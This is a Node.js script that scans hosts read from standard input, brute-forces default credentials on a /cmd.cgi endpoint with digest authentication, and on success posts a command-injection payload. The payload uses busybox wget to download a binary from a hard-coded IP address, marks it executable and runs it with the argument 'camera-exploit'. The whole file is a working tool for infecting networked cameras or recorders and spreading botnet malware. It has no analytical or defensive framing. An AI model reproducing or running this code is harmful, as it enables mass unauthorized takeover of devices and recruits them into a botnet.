

let digest = require("./index.js");
require('events').EventEmitter.defaultMaxListeners = Infinity;
const fs = require('fs');

process.on('uncaughtException', function(er) {
    //console.error(er)
});
process.on('unhandledRejection', function(er) {
    //console.error(er)
});

let logins = ["admin:000000", "pineadmin:000000", "admin:admin", "admin:123456", "admin:111111"]


const payload = "cmd=cd+/tmp%3b+rm+-rf+*arm7%3b+busybox+wget+http%3a//66.29.151.122/bins/djsuaux%3b+chmod+777+djsuaux%3b+./djsuaux+camera-exploit"

console.log('exp')

async function sendExploit(host, login) {
    try{
        const options = {
            hostname: host[0],
            port: host[1],
            path: '/cmd.cgi',
            method: 'POST',
            headers: {
                'Host': `${host[0]}:${host[1]}`,
                'Content-Length': payload.length,
                'Cache-Control': 'max-age=0',
                'Upgrade-Insecure-Requests': '1',
                'Origin': `http://${host[0]}:${host[1]}`,
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Referer': `http://${host[0]}:${host[1]}/cmd.cgi`,
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'Connection': 'close'
            }
            
        }
        let PostData = (_err, _data) => {}
        digest.digestRequest(options, payload, login[0], login[1], PostData);
    } catch (e) {console.log(e)}
}

async function sendLogin(host) {
    try{
        host = host.split(':');
        const options = {
            hostname: host[0],
            port: host[1],
            timeout: 5000,
            path: '/cmd.cgi',
            method: 'GET',
            headers: {
                'Host': `${host[0]}:${host[1]}`,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36',
                'Upgrade-Insecure-Requests': '1',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'Connection': 'close'
            }
        }
        logins.forEach(async (login) =>{
            try{
                login = login.split(":");
                let GetData = async (err, data) => {
                    if (data) {
                        console.log(`[\x1b[32m+\x1b[0m] - \x1b[4m${host[0]}:${host[1]}\x1b[0m - ${login}`)
                    }
                    if (data.includes("PDR Command")) {
                        await sendExploit(host, login);
                        return;
                    }
                }
                digest.digestRequest(options, null, login[0], login[1], GetData)
            } catch (e) {}
        })
    
    } catch (e) {}
}

var LineByLineReader = require('line-by-line'),
    lr = new LineByLineReader(process.stdin);

lr.on('line', async function checkLine(line){
    lr.pause();
    await sendLogin(line)
    /*setTimeout(function () {
        lr.resume();
    }, 1000)*/
    lr.resume();

})
